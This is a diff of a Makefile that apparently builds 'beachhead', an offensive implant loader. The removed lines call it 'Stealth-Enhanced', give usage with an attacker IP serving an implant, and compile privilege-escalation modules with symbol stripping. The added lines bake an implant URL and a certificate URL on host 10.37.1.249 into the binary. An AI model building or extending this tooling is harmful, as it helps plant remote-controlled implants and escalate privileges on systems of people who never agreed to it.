@@ -1,27 +1,17 @@
-# Beachhead Makefile (Stealth-Enhanced)
-# Usage: make URL="http://<attacker_ip>/implant"
-
+# Change this to your url
 URL ?= "http://10.37.1.249/implant"
+CERT_URL = "http://10.37.1.249/cert.pem"
 
+# Compiler and flags for c++
 CXX = g++
-CXXFLAGS = -O3 -s -Wall -Wextra -fno-stack-protector \
-           -ffunction-sections -fdata-sections -DURL='$(URL)'
-LDFLAGS = -Wl,--gc-sections
-
+CXXFLAGS = -O2 -s -DURL='$(URL)' -DCERT_URL='$(CERT_URL)'
 TARGET = beachhead
-SRCS = beachhead.cpp privesc_check.cpp privesc.cpp
-OBJS = $(SRCS:.cpp=.o)
+SRC = beachhead.cpp 
 
 all: $(TARGET)
 
-$(TARGET): $(OBJS)
-	$(CXX) $(CXXFLAGS) -o $(TARGET) $(OBJS) $(LDFLAGS)
-	strip --strip-all $(TARGET)
-
-%.o: %.cpp privesc_check.h privesc.h
-	$(CXX) $(CXXFLAGS) -c $< -o $@
+$(TARGET): $(SRC)
+	$(CXX) $(CXXFLAGS) -o $(TARGET) $(SRC)
 
 clean:
-	rm -f $(TARGET) $(OBJS)
-
-.PHONY: all clean
+	rm -f $(TARGET)
